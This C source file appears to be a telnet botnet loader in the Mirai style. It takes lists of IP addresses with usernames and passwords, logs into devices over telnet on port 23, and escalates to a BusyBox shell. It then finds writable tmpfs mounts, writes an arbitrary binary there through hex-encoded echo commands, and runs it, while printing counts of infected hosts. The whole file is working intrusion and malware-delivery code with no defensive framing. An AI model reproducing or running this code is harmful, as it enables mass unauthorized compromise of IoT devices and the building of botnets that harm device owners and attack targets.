#define _GNU_SOURCE

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <fcntl.h>
#include <ctype.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <sys/queue.h>
#include <sys/epoll.h>
#include <glob.h>


#define TOKEN           "/bin/busybox VDOSS"
#define TOKEN_VERIFY    "applet not found"
#define EXEC_VERIFY     "YESHELLO"

#define BYTES_PER_LINE      128
#define CHARS_PER_BYTE      5
#define MAX_SLICE_LENGTH    (BYTES_PER_LINE * CHARS_PER_BYTE)

static char *bind_ip = "0.0.0.0";
static unsigned char debug_mode = 0;
static int maxConnectedSockets = 0;

static char *bin_server = NULL;
static unsigned short bin_port = NULL;
static char *bin_path = NULL;

volatile int running_threads = 0;
volatile unsigned long found_srvs = 0;
volatile unsigned int bytes_sent = 0;
volatile unsigned long timed_out = 0;
volatile unsigned long login_done = 0;
volatile unsigned long failed_connect = 0;
volatile unsigned long remote_hangup = 0;
volatile unsigned short port = 0;
volatile unsigned int maxFDSaw = 0;
FILE *infd;
char *run_arg = NULL;

static int epollFD;

struct stateSlot_t
{
    int slotUsed;
    
    pthread_mutex_t mutex;
    
    unsigned char success;
    unsigned char is_open;
    unsigned char special;
    unsigned char got_prompt;
    
    uint8_t pathInd;
    
    uint16_t echoInd;
    
    int complete;
    uint32_t ip;
    
    int fd;
    int updatedAt;
    int reconnecting;
    
    unsigned char state;
    
    char path[5][32];
    char username[32];
    char password[32];
};

struct
{
    int num_slices;
    unsigned char **slices;
} binary;

struct stateSlot_t stateTable[1024 * 100] = {0};

extern float ceilf (float x);

static int diff(int val)
{
    return (val > 0) ? val : 0;
}

int matchPrompt(char *bufStr)
{
    int i = 0, q = 0;
    char *prompts = ":>%$#";
    
    char *tmpStr = malloc(strlen(bufStr) + 1);
    memset(tmpStr, 0, strlen(bufStr) + 1);
    
    // ayy lmao copy pasta for removing ansi shit
    char in_escape = 0;
    for (i = 0; i < strlen(bufStr); i++)
    {
        if (bufStr[i] == '\x1B')
        {
            if (in_escape == 0) 
                in_escape = 1;
        } else if ((in_escape == 1) && (strchr("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", bufStr[i]) != NULL))
        {
            in_escape = 0;
        } else if (in_escape == 0) 
        {
            strncat(tmpStr, &(bufStr[i]), 1);
        }
    }
    
    int bufLen = strlen(tmpStr);
    for(i = 0; i < strlen(prompts); i++)
    {
        while(bufLen > q && (*(tmpStr + bufLen - q) == 0x00 || *(tmpStr + bufLen - q) == ' ' || *(tmpStr + bufLen - q) == '\r' || *(tmpStr + bufLen - q) == '\n')) q++;
        
        if(*(tmpStr + bufLen - q) == prompts[i])
        {
            free(tmpStr);
            return 1;
        }           
    }
    
    free(tmpStr);
    return 0;
}

void hexDump(char *desc, void *addr, int len)
{
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;
    if (desc != NULL) printf ("%s:\n", desc);
    for (i = 0; i < len; i++) {
        if ((i % 16) == 0)
        {
            if (i != 0) printf ("  %s\n", buff);
            printf ("  %04x ", i);
        }
        printf (" %02x", pc[i]);
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) buff[i % 16] = '.';
        else buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    while ((i % 16) != 0)
    {
        printf ("   ");
        i++;
    }
    printf ("  %s\n", buff);
}

int log_recv(int sock, void *buf, int len, int flags)
{
    memset(buf, 0, len);
    int ret = recv(sock, buf, len, flags);
    if (ret > 0)
    {
        int i = 0;
        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    if (debug_mode)
    {
        char hex_buf[32] = {0};
        sprintf(hex_buf, "state %d - recv: %d", stateTable[sock].state, ret);
        if (ret != -1)
            hexDump(hex_buf, buf, ret);
        else
            printf("%s\n", hex_buf);
    }
    return ret;
        
}

int log_send(int sock, void *buf, int len, int flags)
{
    if (debug_mode)
    {
        char hex_buf[32] = {0};
        sprintf(hex_buf, "state %d - send: %d", stateTable[sock].state, len);
        hexDump(hex_buf, buf, len);
    }
    bytes_sent+=len;
    return send(sock, buf, len, flags);
}

int sockprintf(int sock, char *formatStr, ...)
{
    char textBuffer[2048] = {0};
    memset(textBuffer, 0, 2048);
    va_list args;
    va_start(args, formatStr);
    vsprintf(textBuffer, formatStr, args);
    va_end(args);
    int q = log_send(sock,textBuffer,strlen(textBuffer), MSG_NOSIGNAL);
    return q;
}

void *memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
    register char *cur, *last;
    const char *cl = (const char *)l;
    const char *cs = (const char *)s;
    if (l_len == 0 || s_len == 0) 
        return NULL;

    if (l_len < s_len) 
        return NULL;

    if (s_len == 1) 
        return memchr(l, (int)*cs, l_len);

    last = (char *)cl + l_len - s_len;
    for (cur = (char *)cl; cur <= last; cur++)
        if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
            return cur;

    return NULL;
}

void handle_remote_closed(int fd)
{
    remote_hangup++;
}

void handle_timeout(int fd)
{
    timed_out++;
}

void handle_failed_connect(int fd)
{
    failed_connect++;
}

void handle_found(int fd)
{
    /* 
    struct stateSlot_t *state = &stateTable[fd];
    
    struct sockaddr_in name;
    int namelen = (sizeof (struct sockaddr_in));

    getpeername(state->fd, &name, &namelen);
    
    FILE *fp = fopen("loaded.txt", "a");
    fprintf(outfd, "%d.%d.%d.%d:%s:%s:%s:%d:%d:%d\n",
        (name.sin_addr.s_addr & 0xff), 
        ((name.sin_addr.s_addr & (0xff << 8)) >> 8), 
        ((name.sin_addr.s_addr & (0xff << 16)) >> 16),
        ((name.sin_addr.s_addr & (0xff << 24)) >> 24), 
        
        state->username, 
        state->password, 
        state->path, 
        state->wget, 
        state->endianness, 
        state->arch
    );
    fclose(outfd);
    */
    
    found_srvs++;
}

void closeAndCleanup(int fd)
{
    if(stateTable[fd].slotUsed && stateTable[fd].fd == fd)
    {
        stateTable[fd].slotUsed = 0;
        stateTable[fd].state = 0;
        stateTable[fd].path[0][0] = 0;
        stateTable[fd].path[1][0] = 0;
        stateTable[fd].path[2][0] = 0;
        stateTable[fd].path[3][0] = 0;
        stateTable[fd].path[4][0] = 0;
        stateTable[fd].username[0] = 0;
        stateTable[fd].password[0] = 0;
        stateTable[fd].echoInd = 0;
        stateTable[fd].pathInd = 0;
        stateTable[fd].success = 0;
        stateTable[fd].special = 0;
        stateTable[fd].got_prompt = 0;
    
        if(stateTable[fd].is_open)
        {
            stateTable[fd].is_open = 0;
            
            shutdown(fd, SHUT_RDWR);
            struct linger linger;
            linger.l_onoff = 1;
            linger.l_linger = 0;
            setsockopt(fd, SOL_SOCKET, SO_LINGER, (char *) &linger, sizeof(linger));
            close(fd);
        }
    }
}

void updateAccessTime(int fd)
{
    if(stateTable[fd].slotUsed && stateTable[fd].fd == fd)
    {
        stateTable[fd].updatedAt = time(NULL);
    }
}

int getConnectedSockets()
{
    int q = 0, i = 0;
    for(q = 0; q < maxFDSaw; q++) if(stateTable[q].slotUsed) i++;

    return i;
}

void *flood(void *par1)
{
    __sync_fetch_and_add(&running_threads, 1);

    unsigned char buf[10241] = {0};

    struct epoll_event pevents[25] = {0};
    int ret = 0, i = 0, got = 0, ii = 0;
    while((ret = epoll_wait( epollFD, pevents, 25, 10000 )) >= 0 || (ret == -1 && errno == EINTR))
    {
        if(ret == 0) continue;
        for(i = 0; i < ret; i++)
        {
            if((pevents[i].events & EPOLLERR) || (pevents[i].events & EPOLLHUP) || (pevents[i].events & EPOLLRDHUP) || (!(pevents[i].events & EPOLLIN) && !(pevents[i].events & EPOLLOUT)))
            {
                struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                if (state->state == 0) handle_failed_connect(state->fd);
                else handle_remote_closed(state->fd);
                pthread_mutex_lock(&state->mutex);
                closeAndCleanup(state->fd);
                pthread_mutex_unlock(&state->mutex);
            } else if(pevents[i].events & EPOLLIN)
            {
                int is_closed = 0;
                struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                
                memset(buf, 0, 10241);
                
                pthread_mutex_lock(&state->mutex);
                int old_state = state->state;
                
                got = 0;
                do
                {
                    if(state->state == 1)
                    {
                        if ((got = log_recv(state->fd, buf, 1, MSG_PEEK)) > 0 && buf[0] == 0xFF)
                            state->state = 2;
                        
                        if (got > 0 && buf[0] != 0xFF)
                            state->state = 3;
                    }

                    if (state->state == 2)
                    {
                        //from first peek
                        log_recv(state->fd, buf, 1, 0);
                        
                        got = log_recv(state->fd, buf + 1, 2, 0);
                        if (got > 0)
                        {
                            state->state = 1;
                            
                            if (buf[1] == 0xFD && buf[2] == 31)
                            {
                                unsigned char tmp1[3] = {255, 251, 31};
                                log_send(state->fd, tmp1, 3, MSG_NOSIGNAL);
                                unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
                                log_send(state->fd, tmp2, 9, MSG_NOSIGNAL);
                                continue;
                            }
                            
                            for (ii = 0; ii < 3; ii++)
                            {
                                    if (buf[ii] == 0xFD) buf[ii] = 0xFC;
                                    else if (buf[ii] == 0xFB) buf[ii] = 0xFD;
                            }
                            log_send(state->fd, buf, 3, MSG_NOSIGNAL);
                        }
                    }
                } while(got > 0 && state->state != 3);
                
                if (state->state == 3)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        //special case for huawei
                        if (memmem(buf, got, "Huawei Home Gateway", 19) != NULL)
                            state->special = 1;
                        
                        if (memmem(buf, got, "BusyBox", 7) != NULL)
                        {
                            state->got_prompt = 1;
                            
                            //maybe we are logged in already? LOL
                            sockprintf(state->fd, "enable\r\n");
                            state->state = 7;
                            break;
                        }
                        
                        if (memmem(buf, got, "ogin", 4) != NULL || memmem(buf, got, "sername", 7) != NULL || matchPrompt(buf))
                        {
                            state->got_prompt = 1;
                            
                            sockprintf(state->fd, "%s\r\n", state->username);
                            state->state = 4;
                            break;
                        }
                    }
                }
                
                if (state->state == 4)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (memmem(buf, got, "assword", 7) != NULL || matchPrompt(buf))
                        {
                            sockprintf(state->fd, "%s\r\n", state->password);
                            state->state = 5;
                            break;
                        }
                    }
                }
                
                if (state->state == 5)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "access denied") != NULL || strcasestr(buf, "invalid password") != NULL || strcasestr(buf, "login incorrect") != NULL || strcasestr(buf, "password is wrong") != NULL)
                        {
                            //bad login. reconnect and retry
                            state->state = 254;
                            break;
                        }
                        
                        if (strcasestr(buf, "BusyBox") != NULL || matchPrompt(buf))
                        {
                            //REASONABLY sure we got a good login.
                            sockprintf(state->fd, "enable\r\n");
                            state->state = 6;
                            break;
                        }
                    }
                }
                
                if (state->state == 6)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        sockprintf(state->fd, "shell\r\n");
                        state->state = 7;
                        break;
                    }
                }
                
                if (state->state == 7)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        sockprintf(state->fd, "sh\r\n");
                        if (state->special == 1)
                        {
                            state->state = 250;
                        } else {
                            state->state = 8;
                        }
                        break;
                    }
                }
                
                if (state->state == 8)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (matchPrompt(buf))
                        {
                            sockprintf(state->fd, "%s\r\n", TOKEN);
                            state->state = 9;
                            break;
                        }
                    }
                }
                
                if (state->state == 9)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, TOKEN_VERIFY) != NULL && matchPrompt(buf))
                        {
                            sockprintf(state->fd, "cat /proc/mounts\r\n");
                            state->state = 10;
                            break;
                        }
                    }
                }
                
                if (state->state == 10)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strstr(buf, "tmpfs") != NULL || strstr(buf, "ramfs") != NULL)
                        {
                            char *tmp_buf = buf;
                            char *start = NULL;
                            char *space = NULL;
                            int memes = 0;
                            do
                            {
                                start = strstr(tmp_buf, "tmpfs") != NULL ? strstr(tmp_buf, "tmpfs") : strstr(tmp_buf, "ramfs");
                                space = strchr(start, ' ');
                                if (start != tmp_buf && *(start - 1) != '\n')
                                {
                                    //this is a middle of line find
                                    while(start > buf && *start != '\n') start--;
                                    
                                    //WEVE GONE TOO FAR GOTTA BLAST
                                    if (start == buf)
                                        continue;
                                    
                                    start++;
                                    space = strchr(start, ' ');
                                }
                                
                                if (space[1] == '/')
                                {
                                    int iii = 1;

                                    for (iii = 1; ; iii++) {
                                        if (space[iii] == '\0' || space[iii] == ' ') {
                                            break;
                                        }
                                    }
                                    
                                    if (iii > 1) {
                                        strncpy(state->path[memes], &space[1], iii - 1);
                                        state->path[memes][iii - 1] = '\0';
                                        memes++;
                                    }
                                    
                                    space = space + iii; 
                                    if (space[0] != '\0')
                                    {
                                        for (iii = 1; ; iii++) {
                                            if (space[iii] == '\0' || space[iii] == ' ') {
                                                break;
                                            }
                                        }
                                        space = space + iii;
                                    } else {
                                        break;
                                    }
                                }
                                
                                tmp_buf = space;
                            } while(strstr(tmp_buf, "tmpfs") != NULL || strstr(tmp_buf, "ramfs") != NULL && memes < 5);
                            
                            if (strlen(state->path[0]) == 0)
                            {
                                strcpy(state->path[0], "/");
                            }
                            
                            sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[0], state->path[0], state->path[0]);
                            state->state = 100;
                            break;
                        } else if (matchPrompt(buf))
                        {
                            strcpy(state->path[0], "/var/run");
                            sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[0], state->path[0], state->path[0]);
                            state->state = 100;
                            break;
                        }
                    }
                }
                
                if (state->state == 100)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            sockprintf(state->fd, "/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd]);
                            state->state = 101;
                            break;
                        } else if (matchPrompt(buf))
                        {
                            state->pathInd++;
                            if (state->pathInd == 5 || strlen(state->path[state->pathInd]) == 0)
                            {
                                strcpy(state->path[0], "/var/run");
                                state->pathInd = 0;
                                sockprintf(state->fd, "/bin/busybox echo -ne '' > %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd]);
                                state->state = 101;
                                break;
                            }
                            sockprintf(state->fd, "/bin/busybox mkdir -p %s; /bin/busybox rm %s/a; /bin/busybox cp -f /bin/sh %s/a && /bin/busybox VDOSS\r\n", state->path[state->pathInd], state->path[state->pathInd], state->path[state->pathInd]);
                            break;
                        }
                    }
                }
                
                if (state->state == 101)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            sockprintf(state->fd, "/bin/busybox echo -ne %s >> %s/a && /bin/busybox VDOSS\r\n", binary.slices[state->echoInd++], state->path[state->pathInd]);
                            if (state->echoInd == binary.num_slices) state->state = 102;
                            else state->state = 101;
                            break;
                        }
                    }
                }
                
                if (state->state == 102)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            sockprintf(state->fd, "%s/a %s; /bin/busybox VDOSS\r\n", state->path[state->pathInd], run_arg);
                            state->state = 103;
                            break;
                        }
                    }
                }
                
                if (state->state == 103)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            state->state = 255;
                            break;
                        }
                    }
                }
                
                if (state->state == 250)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (matchPrompt(buf))
                        {
                            sockprintf(state->fd, "show text /proc/self/environ\r\n");
                            state->state = 251;
                            break;
                        }
                    }
                }
                
                if (state->state == 251)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (memmem(buf, got, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16) != NULL || matchPrompt(buf))
                        {
                            sockprintf(state->fd, "export PS1=\"prompt>\"\r\n");
                            state->state = 8;
                            break;
                        }
                    }
                }
                
                //reconnect and retry
                if (state->state == 254)
                {
                    closeAndCleanup(state->fd); 
                    is_closed = 1;
                }
                
                if (state->state == 255)
                {
                    if (state->success)
                    {
                        handle_found(state->fd);
                    }
                    closeAndCleanup(state->fd); 
                    is_closed = 1;
                }
                
                if (state->slotUsed && (old_state != state->state || state->state == 101))
                    updateAccessTime(state->fd);
                
                pthread_mutex_unlock(&state->mutex);
                
                if (!is_closed)
                {
                    struct epoll_event event = {0};
                    event.data.fd = state->fd;
                    event.events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
                    epoll_ctl(epollFD, EPOLL_CTL_MOD, state->fd, &event);
                }
            } else if(pevents[i].events & EPOLLOUT)
            {   
                struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                
                pthread_mutex_lock(&state->mutex);
                if(state->state == 0)
                {
                    int so_error = 0;
                    socklen_t len = sizeof(so_error);
                    getsockopt(state->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
                    if (so_error) {  handle_failed_connect(state->fd); closeAndCleanup(state->fd); pthread_mutex_unlock(&state->mutex); continue; }
                    
                    state->state = 1;
                    
                    pevents[i].events = EPOLLIN | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
                    epoll_ctl(epollFD, EPOLL_CTL_MOD, state->fd, &pevents[i]);
                } else {
                    printf("wrong state on connect epoll: %d\n", state->fd);
                    closeAndCleanup(state->fd);
                }
                pthread_mutex_unlock(&state->mutex);
            }
        }
    }

    __sync_fetch_and_sub(&running_threads, 1);

    return NULL;
}

void sighandler(int sig)
{
    printf("\nctrl-c\n");
    exit(0);
}

void chomp(char *s)
{
    while(*s && *s != '\n' && *s != '\r') s++;
    *s = 0;
}

void *loader(void *threadCount)
{
    char readmelolfgt[1024], *hahgay;
    memset(readmelolfgt, 0, 1024);

    char *pch = NULL;
    char *running, *orig, *token;
    while(fgets(readmelolfgt, 1024, infd) != NULL)
    {
        while(getConnectedSockets() > (maxConnectedSockets - 1))
        {
            int curTime = time(NULL);
            int q;
            for(q = 0; q < maxFDSaw; q++)
            {
                pthread_mutex_lock(&stateTable[q].mutex);
                if(stateTable[q].slotUsed && curTime > (stateTable[q].updatedAt + 60) && stateTable[q].reconnecting == 0)
                {
                    if (stateTable[q].state == 0) handle_failed_connect(stateTable[q].fd);
                    else handle_timeout(stateTable[q].fd);
                    
                    closeAndCleanup(stateTable[q].fd);
                }
                pthread_mutex_unlock(&stateTable[q].mutex);
            }

            usleep(1000000);
        }
        running = orig = strdup(readmelolfgt);

        token = strsep(&running, ":");
        if(token == NULL || inet_addr(token) == -1) { free(orig); continue; }
        struct sockaddr_in dest_addr = {0};
        memset(&dest_addr, 0, sizeof(struct sockaddr_in));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        dest_addr.sin_addr.s_addr = inet_addr(token);
        
        int fd = 0;
        struct sockaddr_in my_addr = {0};

        do
        {
            if (errno != EBADF && fd > 0)
                close(fd);
            
            fd = 0;

            if((fd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))<0)
            {
                perror("cant open socket");
                exit(-1);
            }
            fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, NULL) | O_NONBLOCK);
            int flag = 1; 
            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(int));

            memset(&my_addr, 0, sizeof(struct sockaddr_in));
            my_addr.sin_addr.s_addr = inet_addr(bind_ip);
            my_addr.sin_port = htons(port++);
            my_addr.sin_family = AF_INET;
            errno = 0;
        } while(bind(fd, (struct sockaddr *)&my_addr, sizeof(my_addr)) != 0);

        printf("bound\n");

        int res = 0;
        res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if(res < 0 && errno != EINPROGRESS) { close(fd); continue; }

        if(fd > maxFDSaw) maxFDSaw = fd + 1;

        pthread_mutex_lock(&stateTable[fd].mutex);
        if(!stateTable[fd].slotUsed)
        {

            printf("memes\n");
            stateTable[fd].fd = fd;
            stateTable[fd].updatedAt = time(NULL);
            stateTable[fd].slotUsed = 1;
            stateTable[fd].state = 0;
            stateTable[fd].is_open = 1;
            stateTable[fd].special = 0;
            
            token = strsep(&running, ":");
            strcpy(stateTable[fd].username, token);
            
            token = strsep(&running, ":");
            strcpy(stateTable[fd].password, token);
        } else {
            printf("used slot found in loader thread?\n");
        }
        pthread_mutex_unlock(&stateTable[fd].mutex);

        struct epoll_event event = {0};
        event.data.fd = fd;
        event.events = EPOLLOUT | EPOLLRDHUP | EPOLLET | EPOLLONESHOT;
        epoll_ctl(epollFD, EPOLL_CTL_ADD, fd, &event);
        
        free(orig);
    }
    
    printf("done reading input file.\n");

    while(1)
    {
        int curTime = time(NULL);
        int q;
        for(q = 0; q < maxFDSaw; q++)
        {
            pthread_mutex_lock(&stateTable[q].mutex);
            if(stateTable[q].slotUsed && curTime > (stateTable[q].updatedAt + 60) && stateTable[q].reconnecting == 0)
            {
                if (stateTable[q].state == 0) handle_failed_connect(stateTable[q].fd);
                else handle_timeout(stateTable[q].fd);
                
                closeAndCleanup(stateTable[q].fd);
            }
            pthread_mutex_unlock(&stateTable[q].mutex);
        }

        sleep(1);
    }

    close(epollFD);
}

int load_binary(char *path)
{
    // /proc/self/exe still works even when we delete ourselves l0l
    int fd, size = 0, got = 0, i, slice = 0;
    unsigned char ch;
    
    if ((fd = open(path, O_RDONLY)) == -1)
        return -1;
    while ((got = read(fd, &ch, 1)) > 0) size++;
    close(fd);
    
    binary.num_slices = ceil(size / (float)BYTES_PER_LINE);
    binary.slices = calloc(binary.num_slices, sizeof(unsigned char *));
    if (binary.slices == NULL)
        return -1;
        
    for (i = 0; i < binary.num_slices; i++)
    {
        binary.slices[i] = calloc(1, MAX_SLICE_LENGTH + 1);
        if (binary.slices[i] == NULL)
            return -1;
    }
    
    if ((fd = open(path, O_RDONLY)) == -1)
        return -1;
    do
    {
        for (i = 0; i < BYTES_PER_LINE; i++)
        {
            got = read(fd, &ch, 1);
            if (got != 1) break;
            
            sprintf(binary.slices[slice] + strlen(binary.slices[slice]), "\\\\x%02X", ch);
        }
        
        slice++;
    } while(got > 0);
    close(fd);
    
    return 0;
}

int main(int argc, char *argv[ ])
{
    if(argc < 4){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n", argv[0]);
        exit(-1);
    }
    
    signal(SIGPIPE, SIG_IGN);
    
    epollFD = epoll_create(0xDEAD);
    bind_ip = argv[1];
    infd = fopen(argv[2], "r");
    signal(SIGINT, &sighandler);
    int threads = atoi(argv[5]);
    maxConnectedSockets = atoi(argv[6]);
    
    if (argc == 8)
        debug_mode = 1;
    
    int i;
    for(i = 0; i < (1024 * 100); i++)
    {
        pthread_mutex_init(&stateTable[i].mutex, NULL);
    }

    load_binary(argv[3]);
    run_arg = argv[4];

    pthread_t thread;
    pthread_create( &thread, NULL, &loader, (void *) &threads);

    for(i = 0; i < threads; i++) pthread_create( &thread, NULL, &flood, (void *) NULL);

    char timeText[100];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);

    printf("Starting Scan at %s\n", timeText);
    char temp[17] = {0};
    memset(temp, 0, 17);
    sprintf(temp, "Loaded");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "State Timeout");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "No Connect");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Closed Us");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Logins Tried");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "B/s");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Connected");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Running Thrds");
    printf("%s", temp);
    printf("\n");

    sleep(1);

    char *new;
    new = (char *)malloc(16*6);
    while (debug_mode ? 1 : running_threads > 0)
    {
        printf("\r");
        memset(new, '\0', 16*6);
        sprintf(new, "%s|%-15lu", new, found_srvs);
        sprintf(new, "%s|%-15lu", new, timed_out);
        sprintf(new, "%s|%-15lu", new, failed_connect);
        sprintf(new, "%s|%-15lu", new, remote_hangup);
        sprintf(new, "%s|%-15lu", new, login_done);
        sprintf(new, "%s|%-15d", new, bytes_sent);
        sprintf(new, "%s|%-15lu", new, getConnectedSockets());
        sprintf(new, "%s|%-15d", new, running_threads);
        printf("%s", new);
        fflush(stdout);
        bytes_sent=0;
        sleep(1);
    }
    printf("\n");

    now = time(NULL);
    t = localtime(&now);
    strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);
    printf("Scan finished at %s\n", timeText);
    return 0;
}